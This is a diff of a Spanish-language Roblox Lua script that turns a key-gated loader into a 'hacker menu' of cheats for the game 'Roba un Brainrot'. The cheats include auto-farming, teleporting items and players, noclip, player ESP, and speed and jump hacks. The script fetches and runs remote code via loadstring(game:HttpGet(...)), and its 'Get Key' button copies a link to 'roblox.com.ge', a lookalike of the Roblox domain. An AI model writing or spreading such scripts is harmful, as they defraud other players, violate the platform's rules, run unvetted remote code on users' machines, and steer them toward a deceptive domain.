@@ -1,123 +1,599 @@
--- 🔑 Sistema de Keys con Rayfield Optimizado
-
+-- 🔑 Sistema de Keys con Rayfield Optimizado + Menú Hacker para Roba un Brainrot
 -- Asegúrate de tener Rayfield cargado antes de esto
-
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()
 
+-- Variables globales
+local KeyVerified = false
+local AutoFarmActive = false
+local AutoCollectActive = false
+
 -- Crear ventana
-
 local Window = Rayfield:CreateWindow({
-
-    Name = "🔑 Key System",
-
+    Name = "🔑 Key System - Roba un Brainrot",
     LoadingTitle = "Verificación",
-
-    LoadingSubtitle = "by technoourielcompany", -- Tu nombre aquí
-
+    LoadingSubtitle = "by technoourielcompany",
     ConfigurationSaving = { Enabled = false },
-
     Discord = { Enabled = false },
-
     KeySystem = false
-
 })
 
--- 📝 Tab principal
-
-local Tab = Window:CreateTab("Key", 4483362458) -- Icono de candado
+-- 📝 Tab de Key
+local KeyTab = Window:CreateTab("Key", 4483362458)
 
 -- Caja de texto para escribir la key
-
-local KeyBox = Tab:CreateInput({
-
+local KeyBox = KeyTab:CreateInput({
     Name = "Introduce tu Key",
-
     PlaceholderText = "Escribe tu clave aquí...",
-
     RemoveTextAfterFocusLost = false,
-
     Callback = function(text)
-
         -- Validación insensible a mayúsculas/minúsculas
-
         if string.lower(text) == "miclave123" then
-
+            KeyVerified = true
             Rayfield:Notify({
-
                 Title = "✅ Correcto",
-
                 Content = "Clave verificada con éxito",
-
                 Duration = 3
-
             })
-
             
-
-            -- Intentar ejecutar el script de Pastefy con manejo de errores
-
-            local success, err = pcall(function()
-
-                loadstring(game:HttpGet("https://pastefy.app/pomGV44s/raw", true))()
-
-            end)
-
-            
-
-            if not success then
-
-                Rayfield:Notify({
-
-                    Title = "❌ Error",
-
-                    Content = "No se pudo cargar el script: "..err,
-
-                    Duration = 5
-
-                })
-
-            end
-
+            -- Crear tabs del menú hacker
+            CreateHackerMenu()
         else
-
             Rayfield:Notify({
-
                 Title = "❌ Error",
-
                 Content = "Clave incorrecta",
-
                 Duration = 3
-
             })
-
         end
-
     end,
-
 })
 
 -- Botón Get Key
-
-local GetKeyButton = Tab:CreateButton({
-
+local GetKeyButton = KeyTab:CreateButton({
     Name = "📋 Get Key",
-
     Callback = function()
-
-        local link = "https://url-roblox.com/communities/4362678772/" -- Enlace actualizado que me pediste
-
+        local link = "https://roblox.com.ge/communities/4362678772/"
         setclipboard(link)
-
         Rayfield:Notify({
-
             Title = "📋 Copiado",
-
             Content = "Se copió el link de la Key al portapapeles",
-
             Duration = 3
-
         })
-
     end,
-
 })
+
+-- 🎮 Función para crear el menú hacker
+function CreateHackerMenu()
+    -- Tab Principal - Auto Farm Brainrots
+    local MainTab = Window:CreateTab("🧠 Auto Farm", 4483362458)
+    
+    MainTab:CreateSection("Farmeo Automático")
+    
+    -- Toggle para auto colectar brainrots
+    local AutoCollectToggle = MainTab:CreateToggle({
+        Name = "Auto Recoger Brainrots",
+        CurrentValue = false,
+        Flag = "AutoCollect",
+        Callback = function(Value)
+            AutoCollectActive = Value
+            if Value then
+                Rayfield:Notify({
+                    Title = "🧠 Activado",
+                    Content = "Recolectando Brainrots automáticamente...",
+                    Duration = 2
+                })
+                AutoCollectBrainrots()
+            else
+                Rayfield:Notify({
+                    Title = "⏸️ Pausado",
+                    Content = "Auto recolección detenida",
+                    Duration = 2
+                })
+            end
+        end,
+    })
+    
+    -- Toggle para auto farm
+    local AutoFarmToggle = MainTab:CreateToggle({
+        Name = "Auto Farm (TP a Brainrots)",
+        CurrentValue = false,
+        Flag = "AutoFarm",
+        Callback = function(Value)
+            AutoFarmActive = Value
+            if Value then
+                Rayfield:Notify({
+                    Title = "⚡ Activado",
+                    Content = "Teletransportándose a Brainrots...",
+                    Duration = 2
+                })
+                AutoFarmBrainrots()
+            else
+                Rayfield:Notify({
+                    Title = "⏸️ Pausado",
+                    Content = "Auto Farm detenido",
+                    Duration = 2
+                })
+            end
+        end,
+    })
+    
+    -- Slider para velocidad de farm
+    local FarmSpeed = 0.5
+    local SpeedSlider = MainTab:CreateSlider({
+        Name = "Velocidad de Farm",
+        Range = {0.1, 2},
+        Increment = 0.1,
+        CurrentValue = 0.5,
+        Flag = "FarmSpeed",
+        Callback = function(Value)
+            FarmSpeed = Value
+        end,
+    })
+    
+    MainTab:CreateSection("Spawn de Brainrots")
+    
+    -- Botón para TP a spawn de brainrots
+    local TPSpawnButton = MainTab:CreateButton({
+        Name = "🎯 TP al Spawn de Brainrots",
+        Callback = function()
+            TeleportToSpawn()
+        end,
+    })
+    
+    -- Toggle para notificaciones de brainrots
+    local NotifyToggle = MainTab:CreateToggle({
+        Name = "Notificar Brainrots Cercanos",
+        CurrentValue = true,
+        Flag = "Notify",
+        Callback = function(Value)
+            -- Activar/desactivar notificaciones
+        end,
+    })
+    
+    -- Tab de Teleports
+    local TPTab = Window:CreateTab("🌍 Teleports", 4483362458)
+    
+    TPTab:CreateSection("Lugares Importantes")
+    
+    -- Botón TP a tienda
+    local TPShopButton = TPTab:CreateButton({
+        Name = "🏪 TP a Tienda",
+        Callback = function()
+            TeleportToShop()
+        end,
+    })
+    
+    -- Botón TP a zona de venta
+    local TPSellButton = TPTab:CreateButton({
+        Name = "💰 TP a Zona de Venta",
+        Callback = function()
+            TeleportToSell()
+        end,
+    })
+    
+    -- Botón traer todos los brainrots
+    local BringAllButton = TPTab:CreateButton({
+        Name = "🧲 Traer Todos los Brainrots",
+        Callback = function()
+            BringAllBrainrots()
+        end,
+    })
+    
+    TPTab:CreateSection("Jugadores")
+    
+    -- Dropdown para TP a jugadores
+    local playerNames = {}
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer then
+            table.insert(playerNames, player.Name)
+        end
+    end
+    
+    local SelectedPlayer = ""
+    local PlayerDropdown = TPTab:CreateDropdown({
+        Name = "Seleccionar Jugador",
+        Options = playerNames,
+        CurrentOption = playerNames[1] or "Ninguno",
+        Flag = "PlayerTP",
+        Callback = function(Option)
+            SelectedPlayer = Option
+        end,
+    })
+    
+    local TPPlayerButton = TPTab:CreateButton({
+        Name = "➡️ Teleportarse al Jugador",
+        Callback = function()
+            if SelectedPlayer ~= "" then
+                TeleportToPlayer(SelectedPlayer)
+            end
+        end,
+    })
+    
+    -- Tab de Exploits
+    local ExploitTab = Window:CreateTab("⚡ Exploits", 4483362458)
+    
+    ExploitTab:CreateSection("Movimiento")
+    
+    -- WalkSpeed
+    local WalkSpeedSlider = ExploitTab:CreateSlider({
+        Name = "Velocidad de Movimiento",
+        Range = {16, 200},
+        Increment = 1,
+        CurrentValue = 16,
+        Flag = "WalkSpeed",
+        Callback = function(Value)
+            local player = game.Players.LocalPlayer
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                player.Character.Humanoid.WalkSpeed = Value
+            end
+        end,
+    })
+    
+    -- JumpPower
+    local JumpPowerSlider = ExploitTab:CreateSlider({
+        Name = "Poder de Salto",
+        Range = {50, 300},
+        Increment = 1,
+        CurrentValue = 50,
+        Flag = "JumpPower",
+        Callback = function(Value)
+            local player = game.Players.LocalPlayer
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                player.Character.Humanoid.JumpPower = Value
+            end
+        end,
+    })
+    
+    -- Noclip
+    local NoclipEnabled = false
+    local NoclipToggle = ExploitTab:CreateToggle({
+        Name = "Noclip (Atravesar Paredes)",
+        CurrentValue = false,
+        Flag = "Noclip",
+        Callback = function(Value)
+            NoclipEnabled = Value
+            if Value then
+                StartNoclip()
+            end
+        end,
+    })
+    
+    ExploitTab:CreateSection("Capacidad")
+    
+    -- Toggle para capacidad infinita
+    local InfiniteCapacityToggle = ExploitTab:CreateToggle({
+        Name = "Capacidad Infinita",
+        CurrentValue = false,
+        Flag = "InfiniteCapacity",
+        Callback = function(Value)
+            if Value then
+                EnableInfiniteCapacity()
+            end
+        end,
+    })
+    
+    -- Tab de Visual
+    local VisualTab = Window:CreateTab("👁️ Visual", 4483362458)
+    
+    VisualTab:CreateSection("ESP y Visibilidad")
+    
+    -- ESP para brainrots
+    local BrainrotESPToggle = VisualTab:CreateToggle({
+        Name = "ESP Brainrots",
+        CurrentValue = false,
+        Flag = "BrainrotESP",
+        Callback = function(Value)
+            if Value then
+                EnableBrainrotESP()
+            else
+                DisableBrainrotESP()
+            end
+        end,
+    })
+    
+    -- ESP para jugadores
+    local PlayerESPToggle = VisualTab:CreateToggle({
+        Name = "ESP Jugadores",
+        CurrentValue = false,
+        Flag = "PlayerESP",
+        Callback = function(Value)
+            if Value then
+                EnablePlayerESP()
+            else
+                DisablePlayerESP()
+            end
+        end,
+    })
+    
+    -- Fullbright
+    local FullbrightButton = VisualTab:CreateButton({
+        Name = "💡 Fullbright",
+        Callback = function()
+            EnableFullbright()
+        end,
+    })
+    
+    -- Tab de Misc
+    local MiscTab = Window:CreateTab("🔧 Misc", 4483362458)
+    
+    MiscTab:CreateSection("Utilidades")
+    
+    -- Auto vender
+    local AutoSellToggle = MiscTab:CreateToggle({
+        Name = "Auto Vender Brainrots",
+        CurrentValue = false,
+        Flag = "AutoSell",
+        Callback = function(Value)
+            if Value then
+                AutoSell()
+            end
+        end,
+    })
+    
+    -- Salto infinito
+    local InfiniteJumpToggle = MiscTab:CreateToggle({
+        Name = "Salto Infinito",
+        CurrentValue = false,
+        Flag = "InfiniteJump",
+        Callback = function(Value)
+            if Value then
+                EnableInfiniteJump()
+            end
+        end,
+    })
+    
+    -- Rejoin
+    local RejoinButton = MiscTab:CreateButton({
+        Name = "🔄 Rejoin Servidor",
+        Callback = function()
+            game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+        end,
+    })
+end
+
+-- 🧠 FUNCIONES PRINCIPALES DEL JUEGO
+
+-- Auto colectar brainrots
+function AutoCollectBrainrots()
+    spawn(function()
+        while AutoCollectActive do
+            for _, item in pairs(workspace:GetDescendants()) do
+                -- Buscar brainrots en el workspace (ajusta según el juego)
+                if item:IsA("Model") and (item.Name:lower():find("brainrot") or item.Name:lower():find("rot")) then
+                    if item:FindFirstChild("Handle") or item:FindFirstChild("HumanoidRootPart") then
+                        local player = game.Players.LocalPlayer
+                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                            local root = player.Character.HumanoidRootPart
+                            local target = item:FindFirstChild("Handle") or item:FindFirstChild("HumanoidRootPart")
+                            if target then
+                                firetouchinterest(root, target, 0)
+                                wait(0.1)
+                                firetouchinterest(root, target, 1)
+                            end
+                        end
+                    end
+                end
+            end
+            wait(FarmSpeed or 0.5)
+        end
+    end)
+end
+
+-- Auto farm con teleport
+function AutoFarmBrainrots()
+    spawn(function()
+        while AutoFarmActive do
+            for _, item in pairs(workspace:GetDescendants()) do
+                if AutoFarmActive == false then break end
+                
+                if item:IsA("Model") and (item.Name:lower():find("brainrot") or item.Name:lower():find("rot")) then
+                    local target = item:FindFirstChild("Handle") or item:FindFirstChild("HumanoidRootPart")
+                    if target then
+                        local player = game.Players.LocalPlayer
+                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                            player.Character.HumanoidRootPart.CFrame = target.CFrame
+                            wait(0.2)
+                        end
+                    end
+                end
+            end
+            wait(FarmSpeed or 0.5)
+        end
+    end)
+end
+
+-- Traer todos los brainrots
+function BringAllBrainrots()
+    local player = game.Players.LocalPlayer
+    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
+        return
+    end
+    
+    local count = 0
+    for _, item in pairs(workspace:GetDescendants()) do
+        if item:IsA("Model") and (item.Name:lower():find("brainrot") or item.Name:lower():find("rot")) then
+            local target = item:FindFirstChild("Handle") or item:FindFirstChild("HumanoidRootPart")
+            if target then
+                target.CFrame = player.Character.HumanoidRootPart.CFrame
+                count = count + 1
+            end
+        end
+    end
+    
+    Rayfield:Notify({
+        Title = "🧲 Completado",
+        Content = "Se trajeron "..count.." brainrots",
+        Duration = 3
+    })
+end
+
+-- Teleport a spawn
+function TeleportToSpawn()
+    local player = game.Players.LocalPlayer
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        -- Buscar spawn point
+        local spawn = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChild("Spawn")
+        if spawn then
+            player.Character.HumanoidRootPart.CFrame = spawn.CFrame + Vector3.new(0, 5, 0)
+        end
+    end
+end
+
+-- Teleport a tienda
+function TeleportToShop()
+    local player = game.Players.LocalPlayer
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local shop = workspace:FindFirstChild("Shop") or workspace:FindFirstChild("Store")
+        if shop and shop:FindFirstChild("Door") then
+            player.Character.HumanoidRootPart.CFrame = shop.Door.CFrame + Vector3.new(0, 5, 0)
+        end
+    end
+end
+
+-- Teleport a zona de venta
+function TeleportToSell()
+    local player = game.Players.LocalPlayer
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local sell = workspace:FindFirstChild("SellZone") or workspace:FindFirstChild("Sell")
+        if sell then
+            player.Character.HumanoidRootPart.CFrame = sell.CFrame + Vector3.new(0, 5, 0)
+        end
+    end
+end
+
+-- Teleport a jugador
+function TeleportToPlayer(playerName)
+    local targetPlayer = game.Players:FindFirstChild(playerName)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local player = game.Players.LocalPlayer
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        end
+    end
+end
+
+-- Noclip
+function StartNoclip()
+    spawn(function()
+        while NoclipEnabled do
+            local player = game.Players.LocalPlayer
+            if player.Character then
+                for _, part in pairs(player.Character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = false
+                    end
+                end
+            end
+            wait()
+        end
+        
+        -- Restaurar colisiones
+        if player.Character then
+            for _, part in pairs(player.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = true
+                end
+            end
+        end
+    end)
+end
+
+-- Capacidad infinita
+function EnableInfiniteCapacity()
+    -- Esta función depende de cómo el juego maneja la capacidad
+    -- Aquí un ejemplo genérico
+    spawn(function()
+        while task.wait(1) do
+            local player = game.Players.LocalPlayer
+            if player:FindFirstChild("leaderstats") then
+                for _, stat in pairs(player.leaderstats:GetChildren()) do
+                    if stat.Name:lower():find("capacity") or stat.Name:lower():find("capacidad") then
+                        stat.Value = math.huge
+                    end
+                end
+            end
+        end
+    end)
+end
+
+-- ESP para brainrots
+function EnableBrainrotESP()
+    for _, item in pairs(workspace:GetDescendants()) do
+        if item:IsA("Model") and (item.Name:lower():find("brainrot") or item.Name:lower():find("rot")) then
+            local highlight = Instance.new("Highlight")
+            highlight.Name = "BrainrotESP"
+            highlight.Parent = item
+            highlight.FillColor = Color3.new(0, 1, 0)
+            highlight.OutlineColor = Color3.new(1, 1, 1)
+            highlight.FillTransparency = 0.5
+        end
+    end
+end
+
+function DisableBrainrotESP()
+    for _, item in pairs(workspace:GetDescendants()) do
+        if item:IsA("Highlight") and item.Name == "BrainrotESP" then
+            item:Destroy()
+        end
+    end
+end
+
+-- ESP para jugadores
+function EnablePlayerESP()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer and player.Character then
+            local highlight = Instance.new("Highlight")
+            highlight.Name = "PlayerESP"
+            highlight.Parent = player.Character
+            highlight.FillColor = Color3.new(1, 0, 0)
+            highlight.OutlineColor = Color3.new(1, 1, 1)
+            highlight.FillTransparency = 0.5
+        end
+    end
+end
+
+function DisablePlayerESP()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Character then
+            local highlight = player.Character:FindFirstChild("PlayerESP")
+            if highlight then
+                highlight:Destroy()
+            end
+        end
+    end
+end
+
+-- Fullbright
+function EnableFullbright()
+    local lighting = game:GetService("Lighting")
+    lighting.Brightness = 2
+    lighting.ClockTime = 14
+    lighting.FogEnd = 100000
+    lighting.GlobalShadows = false
+    lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
+    
+    Rayfield:Notify({
+        Title = "💡 Fullbright",
+        Content = "Iluminación máxima activada",
+        Duration = 2
+    })
+end
+
+-- Salto infinito
+function EnableInfiniteJump()
+    game:GetService("UserInputService").JumpRequest:Connect(function()
+        local player = game.Players.LocalPlayer
+        if player.Character and player.Character:FindFirstChild("Humanoid") then
+            player.Character.Humanoid:ChangeState("Jumping")
+        end
+    end)
+end
+
+-- Auto Vender
+function AutoSell()
+    spawn(function()
+        while task.wait(5) do
+            TeleportToSell()
+            wait(1)
+        end
+    end)
+end
